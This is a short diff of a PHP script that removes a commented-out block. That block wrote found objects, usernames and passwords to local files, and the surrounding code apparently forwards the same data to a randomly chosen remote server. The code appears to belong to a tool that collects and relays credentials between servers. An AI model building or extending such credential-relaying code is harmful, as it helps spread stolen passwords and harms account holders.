@@ -59,18 +59,6 @@ if(!count($remoteserver)<=1){
 
 			  		$data=array("key1" => $key1, "key2" => $key2, "object" => $object, "user" => $user, "pwd" => $pwd);
 
-/*<testing> my found/user/pwd file with that
-           $ff = fopen("./found", 'a') or die ("can't open ffile");
-           fwrite($ff, "".$object."\n");
-           fclose($ff);
-           $pf = fopen("./pwds.php", 'a') or die ("can't open pfile");
-           fwrite($pf, "".$pwd."\n");
-           fclose($pf);
-           $uf = fopen("./users.php", 'a') or die ("can't open ufile");
-           fwrite($uf, "".$user."\n");
-           fclose($uf);
-//</testing> */
-
 				  	$arrayrand = array_rand($remoteserver);
 				  	while(strstr($remoteserver[$arrayrand], $_SERVER['SERVER_NAME']) || $remoteserver[$arrayrand] == "" ){
 
